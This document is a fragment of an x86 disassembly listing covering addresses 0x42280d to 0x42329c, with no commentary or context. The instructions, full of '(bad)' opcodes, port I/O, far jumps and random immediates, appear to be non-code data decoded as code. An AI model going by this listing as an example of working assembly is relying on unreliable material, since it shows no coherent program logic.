  42280d:	add    DWORD PTR [edx+0x3d],0xebd4e2dd
  422814:	xchg   ebx,eax
  422815:	xchg   ebp,eax
  422816:	outs   dx,DWORD PTR ds:[esi]
  422817:	lods   eax,DWORD PTR ds:[esi]
  422818:	and    BYTE PTR [esi],bl
  42281a:	ins    DWORD PTR es:[edi],dx
  42281b:	sub    ecx,edi
  42281d:	es pop es
  42281f:	mov    ds:0xbe783317,eax
  422824:	sbb    esp,ebp
  422826:	pop    eax
  422827:	(bad)  
  422828:	retf   
  422829:	hlt    
  42282a:	jne    0x4227b2
  42282c:	jmp    0x7f3c6cb
  422831:	iret   
  422832:	or     BYTE PTR [ecx+ebp*8+0x493a7f51],al
  422839:	sbb    eax,0x744a75f9
  42283e:	rcr    DWORD PTR [ecx],1
  422840:	test   al,0xad
  422842:	inc    ebx
  422843:	scas   al,BYTE PTR es:[edi]
  422844:	pushf  
  422845:	stos   DWORD PTR es:[edi],eax
  422846:	mov    WORD PTR [ebx-0x931d112],ds
  42284c:	adc    DWORD PTR [esi-0x35],ecx
  42284f:	push   ds
  422850:	mov    eax,ds:0xf43b4152
  422855:	scas   al,BYTE PTR es:[edi]
  422856:	sbb    ecx,DWORD PTR [edx+eiz*4+0x43217c32]
  42285d:	dec    ebp
  42285e:	inc    ebx
  42285f:	cli    
  422860:	fiadd  WORD PTR [ebx+0x2]
  422863:	out    0x49,eax
  422865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422866:	cli    
  422867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422868:	pop    edx
  422869:	outs   dx,DWORD PTR ds:[esi]
  42286a:	push   ecx
  42286b:	test   esi,ebp
  42286d:	and    ebp,DWORD PTR [edx-0xed1bd72]
  422873:	xchg   esp,eax
  422874:	and    edi,DWORD PTR [ecx]
  422876:	push   edx
  422877:	jge    0x422802
  422879:	cs xchg edx,eax
  42287b:	hlt    
  42287c:	aas    
  42287d:	mov    edi,edx
  42287f:	sub    DWORD PTR [ebx+edx*2-0xb],esp
  422883:	retf   0xde53
  422886:	and    BYTE PTR [esi-0x37],ah
  422889:	sbb    DWORD PTR [ecx-0x3a002852],0x6aba63c0
  422893:	out    dx,eax
  422894:	or     esp,ecx
  422896:	iret   
  422897:	mov    cl,0x2d
  422899:	and    al,ch
  42289b:	popa   
  42289c:	test   al,0x30
  42289e:	dec    BYTE PTR [esi+0x62ebdcd]
  4228a4:	je     0x4228a7
  4228a6:	adc    BYTE PTR [edi],ch
  4228a8:	mov    edi,0x9417d0c2
  4228ad:	mov    dl,0xb2
  4228af:	mov    ah,0x5
  4228b1:	leave  
  4228b2:	(bad)  
  4228b3:	jmp    0x8b0c:0xded9e1ee
  4228ba:	sbb    eax,0x6abc2d3e
  4228bf:	cmp    BYTE PTR [ebx],0x50
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	mov    edi,0xd80a1722
  422945:	jno    0x422948
  422947:	add    dh,dh
  422949:	add    BYTE PTR [eax],al
  42294b:	add    BYTE PTR [ebx],bh
  42294d:	bound  edi,QWORD PTR [esp+edx*4]
  422950:	cmp    DWORD PTR [edx-0x79],ecx
  422953:	mov    ds:0x326405db,al
  422958:	xchg   edi,eax
  422959:	jne    0x4229a2
  42295b:	xchg   edx,eax
  42295c:	fcomp  DWORD PTR [eax]
  42295e:	jmp    0x7906:0x372f80a0
  422965:	cmp    eax,0x9220088a
  42296a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42296b:	in     eax,0x5f
  42296d:	popa   
  42296e:	sti    
  42296f:	cdq    
  422970:	pop    esi
  422971:	sub    dh,BYTE PTR [ebx-0x418552bb]
  422977:	test   ecx,eax
  422979:	ret    
  42297a:	out    0x5c,al
  42297c:	push   ss
  42297d:	xor    eax,edx
  42297f:	sbb    al,0x76
  422981:	sbb    ch,al
  422983:	xchg   esp,eax
  422984:	enter  0x1c08,0xc
  422988:	std    
  422989:	retf   0xfefa
  42298c:	pop    es
  42298d:	rol    DWORD PTR [edx-0xb],cl
  422990:	pusha  
  422991:	mov    WORD PTR [eax],es
  422993:	popf   
  422994:	mov    esi,0x9033e73
  422999:	cmp    BYTE PTR [ebx+0x1766b0da],al
  42299f:	cld    
  4229a0:	rol    ebp,0xf
  4229a3:	mov    edi,0xd9d5d76f
  4229a8:	fcmovnu st,st(0)
  4229aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229ab:	xor    ah,BYTE PTR [ebp+edi*4-0x5b]
  4229af:	sbb    eax,0x9b5ef2ce
  4229b4:	mov    gs,WORD PTR [edi]
  4229b6:	test   al,0x66
  4229b8:	ja     0x422966
  4229ba:	iret   
  4229bb:	sub    al,BYTE PTR [ecx*8-0x2676f688]
  4229c2:	dec    edi
  4229c3:	shr    ch,cl
  4229c5:	jno    0x42298d
  4229c7:	adc    DWORD PTR [ebx+esi*2-0x5064c819],ebp
  4229ce:	add    BYTE PTR [esi-0x7b],dh
  4229d1:	clc    
  4229d2:	fmul   st(7),st
  4229d4:	mov    dh,0xbb
  4229d6:	push   edx
  4229d7:	shl    BYTE PTR [edx-0x3793139],1
  4229dd:	loop   0x422a02
  4229df:	mov    ebp,0x8e17b170
  4229e4:	add    bl,BYTE PTR [ecx]
  4229e6:	sbb    BYTE PTR [ebx+0xab11247],0x94
  4229ed:	push   ebx
  4229ee:	in     eax,dx
  4229ef:	aas    
  4229f0:	sbb    eax,DWORD PTR [edi+edi*4]
  4229f3:	loopne 0x422a32
  4229f5:	enter  0x79a2,0xfa
  4229f9:	jle    0x422984
  4229fb:	add    DWORD PTR ds:0x540d0254,0xc866b2f
  422a05:	mov    al,0x5e
  422a07:	jns    0x4229eb
  422a09:	cs push edx
  422a0b:	mov    edi,0x265d9e88
  422a10:	dec    ebx
  422a11:	(bad)  
  422a12:	jg     0x422a4c
  422a14:	jne    0x4229ad
  422a16:	pop    es
  422a17:	jmp    0x3156:0x12c0dd0b
  422a1e:	xchg   esi,eax
  422a1f:	add    dh,ch
  422a21:	dec    esp
  422a22:	cmp    al,0x7d
  422a24:	push   es
  422a25:	dec    edi
  422a26:	repz push es
  422a28:	fisttp QWORD PTR [ecx]
  422a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a2b:	mov    cl,0xe6
  422a2d:	mov    edx,0x685e4b5a
  422a32:	pop    es
  422a33:	lods   al,BYTE PTR ds:[esi]
  422a34:	clc    
  422a35:	mov    ch,0x8f
  422a37:	aaa    
  422a38:	imul   ebx,DWORD PTR [ebp+ecx*8-0x1],0xffffff9b
  422a3d:	sbb    eax,0x278552d9
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	mov    cl,BYTE PTR [ebx+0x79]
  422ac3:	adc    esi,ecx
  422ac5:	jb     0x422ac8
  422ac7:	add    dh,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    BYTE PTR [esi+0x7f0e43c5],bl
  422ad1:	aas    
  422ad2:	inc    ebx
  422ad3:	jbe    0x422a62
  422ad5:	xchg   edi,eax
  422ad6:	adc    DWORD PTR [eax-0x5795ada4],ebp
  422adc:	push   edi
  422add:	ds in  eax,dx
  422adf:	jecxz  0x422b12
  422ae1:	adc    BYTE PTR [ecx+0x5b7714c4],dl
  422ae7:	fsub   QWORD PTR [esi+esi*2]
  422aea:	sbb    BYTE PTR [ebp+0x56d9aaaa],0x31
  422af1:	push   eax
  422af2:	push   ecx
  422af3:	jle    0x422ac0
  422af5:	sub    al,0x0
  422af7:	ror    dl,0x51
  422afa:	je     0x422b3c
  422afc:	adc    al,0x6f
  422afe:	js     0x422ab8
  422b00:	push   cs
  422b01:	dec    edx
  422b02:	js     0x422af2
  422b04:	repnz shl DWORD PTR [ecx+0x38],cl
  422b08:	neg    DWORD PTR [eax-0x6a3fed7c]
  422b0e:	iret   
  422b0f:	lock ins BYTE PTR es:[edi],dx
  422b11:	push   ss
  422b12:	fs (bad) 
  422b15:	fldenv [eax+ebp*4+0xcbe1912]
  422b1c:	les    edi,FWORD PTR [ebx]
  422b1e:	jp     0x422ab7
  422b20:	out    0xdb,eax
  422b22:	xchg   BYTE PTR ss:[edx],al
  422b25:	data16 cmp BYTE PTR ds:0x5371f56,0x85
  422b2d:	inc    esi
  422b2e:	(bad)  
  422b2f:	xor    DWORD PTR [edx],ebp
  422b31:	sub    al,0xa8
  422b33:	inc    esi
  422b34:	push   ecx
  422b35:	mov    ah,0x76
  422b37:	sar    DWORD PTR [edx+0x6a],cl
  422b3a:	add    BYTE PTR [ecx-0x180eb2b],ch
  422b40:	sub    dh,BYTE PTR [ecx]
  422b42:	add    al,BYTE PTR [edx+ecx*2+0x6]
  422b46:	fnstsw WORD PTR [edx+0x15]
  422b49:	or     al,0x33
  422b4b:	cmp    BYTE PTR [ecx+0x42],al
  422b4e:	inc    esp
  422b4f:	fxam   
  422b51:	imul   esp,DWORD PTR [edx-0x53],0x6f048414
  422b58:	ficom  WORD PTR [eax]
  422b5a:	add    BYTE PTR [edi+ecx*1-0x74f46414],ch
  422b61:	dec    ebp
  422b62:	xor    dl,BYTE PTR [edx-0x3f]
  422b65:	nop
  422b66:	mov    eax,0x9058074
  422b6b:	out    dx,al
  422b6c:	popf   
  422b6d:	(bad)  
  422b6e:	and    al,0xf0
  422b70:	cmp    al,0xf3
  422b72:	cmp    ebp,ebp
  422b74:	sbb    DWORD PTR [ebx+0x1c],0x3d
  422b78:	push   edx
  422b79:	ins    DWORD PTR es:[edi],dx
  422b7a:	not    eax
  422b7c:	fisub  WORD PTR ds:0x69e9bb70
  422b82:	pop    esp
  422b83:	mov    ds:0x3ff636f,al
  422b88:	push   esp
  422b89:	ret    
  422b8a:	jns    0x422b7e
  422b8c:	mov    WORD PTR [ebp+0x64],?
  422b8f:	sbb    al,0x3d
  422b91:	dec    ecx
  422b92:	mov    al,ds:0x812f29ad
  422b97:	mov    ebx,0x1b574436
  422b9c:	cmp    DWORD PTR [edi-0xc],ebp
  422b9f:	neg    BYTE PTR [eax+0x5da6f218]
  422ba5:	fdivr  DWORD PTR [ecx+0x4951194a]
  422bab:	in     eax,dx
  422bac:	das    
  422bad:	or     eax,0xb14c29e5
  422bb2:	fs sbb al,0x3c
  422bb5:	outs   dx,BYTE PTR ds:[esi]
  422bb6:	add    esi,DWORD PTR [ecx-0x1f]
  422bb9:	jp     0x422ba0
  422bbb:	cld    
  422bbc:	sub    DWORD PTR [edi+eiz*2+0x50],ebx
  422bc0:	mov    dl,0x8
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	mov    esp,0xc4d790c2
  422c45:	jae    0x422c48
  422c47:	add    dh,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebx-0x511c7d7d],bh
  422c51:	adc    al,0x88
  422c53:	retf   0x59
  422c56:	rcl    ebx,cl
  422c58:	loop   0x422c6d
  422c5a:	push   es
  422c5b:	dec    eax
  422c5c:	out    dx,eax
  422c5d:	mov    dh,0xea
  422c5f:	push   ds
  422c60:	inc    edx
  422c61:	data16 and BYTE PTR [eax-0x12],0x3b
  422c66:	adc    BYTE PTR ds:0x27f98bbc,bh
  422c6c:	stc    
  422c6d:	pusha  
  422c6e:	adc    al,0x7a
  422c70:	pusha  
  422c71:	push   esp
  422c72:	jp     0x422c14
  422c74:	mov    bh,0x4f
  422c76:	dec    edi
  422c77:	lock mov eax,ds:0x766d1740
  422c7d:	mov    ds:0x7222304f,al
  422c82:	mov    edx,0x22c3b1d4
  422c87:	add    eax,0x2a08b4fd
  422c8c:	in     eax,0xe0
  422c8e:	outs   dx,DWORD PTR ds:[esi]
  422c8f:	out    dx,al
  422c90:	out    dx,al
  422c91:	and    dh,bl
  422c93:	les    ebp,FWORD PTR [esp]
  422c96:	mov    esp,0x1146f243
  422c9b:	ret    0x685d
  422c9e:	shr    BYTE PTR [ebp+0x31],1
  422ca1:	lods   al,BYTE PTR ds:[esi]
  422ca2:	inc    esi
  422ca3:	pushf  
  422ca4:	sar    bh,1
  422ca6:	and    esp,DWORD PTR [esi-0x4b]
  422ca9:	push   ss
  422caa:	ret    
  422cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cac:	int3   
  422cad:	out    dx,al
  422cae:	div    BYTE PTR [eax]
  422cb0:	add    al,0x42
  422cb2:	jns    0x422c71
  422cb4:	repnz scas al,BYTE PTR es:[edi]
  422cb6:	jp     0x422c4b
  422cb8:	pop    ebp
  422cb9:	pop    ds
  422cba:	mov    DWORD PTR [edx-0x37cdb992],esp
  422cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cc1:	xor    BYTE PTR [esi+ebx*2-0x45],dl
  422cc5:	dec    ecx
  422cc6:	inc    BYTE PTR [ebx+0x3a]
  422cc9:	mov    ds:0x93e5c549,eax
  422cce:	ss sbb eax,0x1c19a240
  422cd4:	cdq    
  422cd5:	push   0x38
  422cd7:	mov    ds:0x9070e160,eax
  422cdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cdd:	and    ebp,ebp
  422cdf:	push   esi
  422ce0:	dec    ebp
  422ce1:	jge    0x422cf8
  422ce3:	mov    al,0x2e
  422ce5:	adc    BYTE PTR [eax-0xd73e904],bh
  422ceb:	nop
  422cec:	sbb    BYTE PTR [ebx],0xc9
  422cef:	out    0x42,eax
  422cf1:	test   DWORD PTR [ebp+0x50],0x213ded4
  422cf8:	fwait
  422cf9:	mov    esi,0x67dfc906
  422cfe:	leave  
  422cff:	fiadd  DWORD PTR ds:0x7e2b7981
  422d05:	dec    esi
  422d06:	fadd   DWORD PTR [edi+eax*2+0x5c]
  422d0a:	scas   al,BYTE PTR es:[edi]
  422d0b:	adc    eax,0x71e309a3
  422d10:	jl     0x422ce6
  422d12:	stos   BYTE PTR es:[edi],al
  422d13:	jnp    0x422cc4
  422d15:	das    
  422d16:	stc    
  422d17:	scas   eax,DWORD PTR es:[edi]
  422d18:	jmp    0xf6ed4491
  422d1d:	and    eax,ecx
  422d1f:	sub    DWORD PTR [eax],0x1b
  422d22:	jp     0x422d18
  422d24:	ficomp DWORD PTR [edi-0x73]
  422d27:	jecxz  0x422d01
  422d29:	fwait
  422d2a:	mov    eax,ds:0xd59b5efb
  422d2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d30:	or     al,BYTE PTR [ebp-0x37748849]
  422d36:	dec    ebx
  422d37:	rol    DWORD PTR [eax],cl
  422d39:	out    dx,al
  422d3a:	sbb    esi,ebx
  422d3c:	lds    ebp,FWORD PTR [eax-0x40]
  422d3f:	outs   dx,BYTE PTR ds:[esi]
  422d40:	(bad)  
  422d41:	fiadd  WORD PTR [eax]
	...
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0xae1f9f7
  422dc2:	mov    ah,0xdc
  422dc4:	mov    edx,0xf6000174
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR ds:0xcd9c58bb,cl
  422dd1:	inc    ebx
  422dd2:	inc    ebp
  422dd3:	sbb    dh,BYTE PTR [edx+0x64]
  422dd6:	aaa    
  422dd7:	push   esp
  422dd8:	fs jno 0x422d6a
  422ddb:	cmp    WORD PTR [ecx-0x7e],bx
  422ddf:	xor    al,0x81
  422de1:	push   esp
  422de2:	xor    BYTE PTR [eax+edi*1-0x42b7e03f],ah
  422de9:	(bad)  
  422dea:	(bad)  
  422deb:	sahf   
  422dec:	xor    DWORD PTR [edi],ebp
  422dee:	sahf   
  422def:	mov    edx,0x4f4a50f6
  422df4:	(bad)  
  422df5:	neg    edx
  422df7:	xor    BYTE PTR [ecx-0x39],dh
  422dfa:	and    al,0xe1
  422dfc:	sub    DWORD PTR [eax+0x12ddc226],0x37878b23
  422e06:	lea    esp,[ecx]
  422e08:	mov    dl,0xf7
  422e0a:	out    dx,eax
  422e0b:	inc    ebp
  422e0c:	jge    0x422e7a
  422e0e:	adc    al,0xf8
  422e10:	jns    0x422db7
  422e12:	icebp  
  422e13:	push   esi
  422e14:	inc    esi
  422e15:	lock (bad) 
  422e17:	or     BYTE PTR [esi+ebx*1],bl
  422e1a:	adc    BYTE PTR [ebp+0x6ca9aa4c],bh
  422e20:	xor    al,0x9b
  422e22:	adc    dh,al
  422e24:	xor    DWORD PTR [eax+ebx*4-0x72eac755],0xffffffc5
  422e2c:	mov    ebp,0xbeb9b64d
  422e31:	push   ebx
  422e32:	pop    eax
  422e33:	push   ss
  422e34:	xor    eax,0xf3131cc9
  422e39:	(bad)  
  422e3a:	dec    ecx
  422e3b:	sub    al,0xb6
  422e3d:	sbb    al,0xd2
  422e3f:	das    
  422e40:	mov    ecx,0x43e77fc9
  422e45:	jecxz  0x422e93
  422e47:	xor    DWORD PTR [ecx-0x54358722],0x6d
  422e4e:	dec    esi
  422e4f:	loope  0x422e3c
  422e51:	pusha  
  422e52:	cwde   
  422e53:	push   0x6acd18b3
  422e58:	pop    ss
  422e59:	push   ss
  422e5a:	adc    dh,BYTE PTR [edi]
  422e5c:	daa    
  422e5d:	call   0xb3e3:0x54951d2e
  422e64:	in     eax,0x64
  422e66:	mov    ds,ebx
  422e68:	jl     0x422ded
  422e6a:	cmp    ebx,DWORD PTR [ebp+0x28]
  422e6d:	ins    DWORD PTR es:[edi],dx
  422e6e:	adc    ebp,DWORD PTR ds:0x68800789
  422e74:	ficomp DWORD PTR [edx+0x55a37d18]
  422e7a:	sub    al,0x9b
  422e7c:	lahf   
  422e7d:	cmp    cl,BYTE PTR [eax-0x1682bd19]
  422e83:	dec    edi
  422e84:	xchg   esi,eax
  422e85:	dec    eax
  422e86:	jno    0x422e18
  422e88:	(bad)  
  422e8a:	jecxz  0x422ea7
  422e8c:	mov    ah,0x1e
  422e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e8f:	xor    eax,ebx
  422e91:	jb     0x422f09
  422e93:	mov    edx,0x7757952a
  422e98:	dec    ebx
  422e99:	dec    edi
  422e9a:	xor    al,0xd6
  422e9c:	mov    ds:0xbb19455c,al
  422ea1:	or     DWORD PTR [edx-0x64],0xffffffcb
  422ea5:	call   0xb2a234a0
  422eaa:	mov    ds:0x68fb0eda,al
  422eaf:	pop    es
  422eb0:	sti    
  422eb1:	fidiv  WORD PTR [esi+edi*1-0x2f]
  422eb5:	xchg   esp,eax
  422eb6:	sub    al,0x8c
  422eb8:	lods   al,BYTE PTR ds:[esi]
  422eb9:	dec    ebp
  422eba:	mov    ebp,DWORD PTR [edi+0x11]
  422ebd:	lods   al,BYTE PTR ds:[esi]
  422ebe:	fwait
  422ebf:	mov    WORD PTR [edi],cs
  422ec1:	add    BYTE PTR [bx+si],al
	...
  422f34:	imul   eax,DWORD PTR [esi],0xffffff8f
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    bl,BYTE PTR fs:[bx+si]
  422f41:	mov    edi,0x75b022d3
  422f46:	add    DWORD PTR [eax],eax
  422f48:	test   BYTE PTR [eax],0x0
  422f4b:	add    dh,cl
  422f4d:	add    ah,BYTE PTR [eax]
  422f4f:	sbb    BYTE PTR [ecx-0x7318b344],al
  422f55:	push   ebp
  422f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f57:	adc    al,0x32
  422f59:	ins    BYTE PTR es:[edi],dx
  422f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f5b:	fiadd  WORD PTR [ebx-0x4d]
  422f5e:	adc    eax,0xa799f700
  422f63:	lea    ebx,[ecx+0x1e]
  422f66:	out    0xed,eax
  422f68:	mov    cl,0xab
  422f6a:	fisub  WORD PTR [ebp-0x78780598]
  422f70:	xchg   esi,eax
  422f71:	fcom   QWORD PTR [ebx+0x4ea6a3b2]
  422f77:	call   0x41bc:0x5df21706
  422f7e:	cmp    al,0xd3
  422f80:	push   0x54a29678
  422f85:	test   DWORD PTR [eax],ecx
  422f87:	in     al,dx
  422f88:	mov    esi,0x86107fbd
  422f8d:	inc    edx
  422f8e:	ins    DWORD PTR es:[edi],dx
  422f8f:	cmp    DWORD PTR [ecx-0x65],esp
  422f92:	mov    eax,ds:0x9b65a7e3
  422f97:	in     al,dx
  422f98:	retf   0xf813
  422f9b:	call   0x1918793
  422fa0:	daa    
  422fa1:	cmp    BYTE PTR [ebx+0x53],cl
  422fa4:	push   ss
  422fa5:	push   cs
  422fa6:	xor    al,BYTE PTR [eax+ebx*1-0x6]
  422faa:	sti    
  422fab:	aad    0x33
  422fad:	(bad)  
  422faf:	test   eax,0x9e791f61
  422fb4:	loopne 0x422f64
  422fb6:	lds    esi,FWORD PTR [ebp+esi*2-0x237d8212]
  422fbd:	mov    edx,0xa4aa5ab2
  422fc2:	mov    edi,0xd5528523
  422fc7:	retf   0xde70
  422fca:	jmp    0x422fd7
  422fcc:	lock pusha 
  422fce:	mov    es,WORD PTR [ebp+0x6b6750b8]
  422fd4:	mov    edi,0x287eff67
  422fd9:	iret   
  422fda:	aaa    
  422fdb:	sub    al,0xc5
  422fdd:	stos   DWORD PTR es:[edi],eax
  422fde:	loop   0x42301e
  422fe0:	fiadd  DWORD PTR [eax]
  422fe2:	daa    
  422fe3:	(bad)  [edi+0x3b60568f]
  422fe9:	or     eax,0x6fe22626
  422fee:	sahf   
  422fef:	mov    ebp,0x2dd0d032
  422ff4:	mov    dh,0x47
  422ff6:	scas   eax,DWORD PTR es:[edi]
  422ff7:	dec    edi
  422ff8:	add    edx,DWORD PTR [ecx+0x1a904138]
  422ffe:	mov    ch,0x47
  423000:	add    dh,BYTE PTR [ebx-0xcb47366]
  423006:	cli    
  423007:	data16 ja 0x423077
  42300a:	arpl   WORD PTR [ebx+ecx*8],dx
  42300d:	pusha  
  42300e:	pusha  
  42300f:	jmp    0xe03599c9
  423014:	ds ins BYTE PTR es:[edi],dx
  423016:	(bad)  
  423017:	ins    BYTE PTR es:[edi],dx
  423018:	pop    esp
  423019:	cmp    bl,dl
  42301b:	fadd   QWORD PTR [edx]
  42301d:	push   esp
  42301e:	test   DWORD PTR [ecx],edx
  423020:	dec    DWORD PTR [edi+0x4e]
  423023:	popf   
  423024:	and    edx,DWORD PTR [ecx+0x60f88d4]
  42302a:	pusha  
  42302b:	popa   
  42302c:	add    al,0x88
  42302e:	dec    ecx
  42302f:	fadd   DWORD PTR [edi]
  423031:	outs   dx,BYTE PTR ds:[esi]
  423032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423033:	(bad)  
  423034:	pop    es
  423035:	fcomp  QWORD PTR [edi-0x61]
  423038:	js     0x42301c
  42303a:	mov    eax,ds:0x7b1df75f
  42303f:	sbb    DWORD PTR [edi],edx
  423041:	inc    esi
	...
  4230b2:	add    BYTE PTR [eax],al
  4230b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230b5:	push   edx
  4230b6:	jnp    0x4230b5
  4230b8:	(bad)  
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	out    0x9e,eax
  4230c2:	pop    edi
  4230c3:	pop    eax
  4230c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230c5:	jbe    0x4230c8
  4230c7:	add    dh,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [ebx-0x2],ah
  4230ce:	jmp    0x423106
  4230d0:	pop    eax
  4230d1:	retf   
  4230d2:	dec    esi
  4230d3:	call   0x1d40:0x8d93c76d
  4230da:	dec    ecx
  4230db:	ds and edi,eax
  4230de:	inc    ebx
  4230df:	mov    edx,0xc14ef5c1
  4230e4:	and    al,0x8c
  4230e6:	stos   DWORD PTR es:[edi],eax
  4230e7:	or     al,0xa8
  4230e9:	xchg   esp,eax
  4230ea:	jno    0x4230a4
  4230ec:	inc    eax
  4230ed:	(bad)  
  4230ee:	jae    0x4230c0
  4230f0:	jnp    0x423124
  4230f2:	and    ebp,0x2c23c3e4
  4230f8:	cmp    bh,BYTE PTR [eax-0x48af4453]
  4230fe:	xor    esp,ecx
  423100:	call   0x3542:0xdfee9621
  423107:	inc    ebx
  423108:	jb     0x423148
  42310a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42310b:	push   esi
  42310c:	cmp    BYTE PTR [esi-0x7535194d],ah
  423112:	idiv   ah
  423114:	(bad)  
  423115:	repnz dec eax
  423117:	cmp    al,0xd9
  423119:	inc    esp
  42311a:	inc    eax
  42311b:	and    al,0x4d
  42311d:	(bad)  
  42311e:	lods   eax,DWORD PTR ds:[esi]
  42311f:	or     ebp,edx
  423121:	xchg   BYTE PTR [esi+ebp*1-0x4b2054fd],ch
  423128:	dec    ebx
  423129:	cli    
  42312a:	aam    0x96
  42312c:	das    
  42312d:	jb     0x4230f5
  42312f:	idiv   BYTE PTR [edx]
  423131:	aaa    
  423132:	push   ss
  423133:	jb     0x42314f
  423135:	cmp    ah,ch
  423137:	into   
  423138:	xor    DWORD PTR [ebp-0x26],eax
  42313b:	mov    esi,0x6bcc4e1f
  423140:	jmp    0x8d71d104
  423145:	rcl    edi,cl
  423147:	sub    al,0x8c
  423149:	data16 daa 
  42314b:	loopne 0x42316f
  42314d:	sbb    BYTE PTR [edi+0xc2400df],ch
  423153:	imul   eax,DWORD PTR [edx],0x75288aa5
  423159:	popf   
  42315a:	in     al,0xdb
  42315c:	mov    BYTE PTR [esi],bh
  42315e:	dec    esi
  42315f:	sub    al,0xd2
  423161:	xor    ch,cl
  423163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423164:	sub    BYTE PTR [ebx+0x7748f788],dl
  42316a:	and    ebx,DWORD PTR [ebx+0x7]
  42316d:	cmp    eax,0x4c928d8
  423172:	and    eax,0xb0a3751e
  423177:	cdq    
  423178:	adc    eax,0x10d60386
  42317d:	ret    
  42317e:	push   0x38
  423180:	daa    
  423181:	fsubr  QWORD PTR [eax]
  423183:	pop    edi
  423184:	inc    ebp
  423185:	sbb    BYTE PTR cs:[ebx],ch
  423188:	xchg   ebx,eax
  423189:	enter  0xaa96,0xc2
  42318d:	mov    dl,0x80
  42318f:	std    
  423190:	mov    ch,0x49
  423192:	jge    0x42320e
  423194:	fiadd  DWORD PTR [ebx]
  423196:	push   ebp
  423197:	lahf   
  423198:	pushf  
  423199:	push   es
  42319a:	jbe    0x42318d
  42319c:	scas   al,BYTE PTR es:[edi]
  42319d:	pop    esi
  42319e:	aaa    
  42319f:	dec    esp
  4231a0:	cmc    
  4231a1:	xor    ecx,ebx
  4231a3:	cmp    al,0x49
  4231a5:	ret    
  4231a6:	mov    edi,0x49b8d33b
  4231ab:	arpl   WORD PTR [ecx-0xf],ax
  4231ae:	cmc    
  4231af:	popf   
  4231b0:	mov    eax,ds:0x2ceca01a
  4231b5:	inc    ebp
  4231b6:	jbe    0x4231fb
  4231b8:	inc    eax
  4231b9:	sbb    ecx,esi
  4231bb:	cmp    DWORD PTR ds:0xbc9d4144,eax
  4231c1:	sbb    eax,0x0
	...
  423232:	add    BYTE PTR [eax],al
  423234:	(bad)  
  423235:	in     eax,dx
  423236:	lods   eax,DWORD PTR ds:[esi]
  423237:	imul   edi
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0xe98fa5b0
  423243:	and    ebx,DWORD PTR [edi+esi*2+0xf60001]
  42324a:	add    BYTE PTR [eax],al
  42324c:	xlat   BYTE PTR ds:[ebx]
  42324d:	retf   
  42324e:	out    0x5c,al
  423250:	stos   BYTE PTR es:[edi],al
  423251:	nop
  423252:	sbb    al,0x49
  423254:	mov    ebx,0x6d7295c3
  423259:	dec    eax
  42325a:	xchg   ebp,eax
  42325b:	shl    edi,0x3a
  42325e:	inc    ecx
  42325f:	sub    al,0xc7
  423261:	pop    es
  423262:	sub    al,0xbc
  423264:	hlt    
  423265:	pushf  
  423266:	pop    edx
  423267:	pop    ebx
  423268:	hlt    
  423269:	or     al,0xca
  42326b:	xlat   BYTE PTR ds:[ebx]
  42326c:	(bad)  
  42326d:	js     0x4232ee
  42326f:	mov    eax,0x265b8d1f
  423274:	xchg   BYTE PTR [eax],bl
  423276:	jb     0x4232d3
  423278:	sahf   
  423279:	aas    
  42327a:	jmp    0xf5c71f43
  42327f:	mov    dl,cl
  423281:	ffreep st(6)
  423283:	push   ebx
  423284:	jecxz  0x423275
  423286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423287:	loop   0x423289
  423289:	pusha  
  42328a:	push   0xffffff91
  42328c:	xchg   BYTE PTR [esi-0x45],dl
  42328f:	in     al,0x84
  423291:	push   ecx
  423292:	popf   
  423293:	addr16 push ss
  423295:	pop    esp
  423297:	fisubr DWORD PTR [esi]
  423299:	sub    ebp,edi
  42329b:	pop    eax
  42329c:	mov    ecx,0xc18b67ff
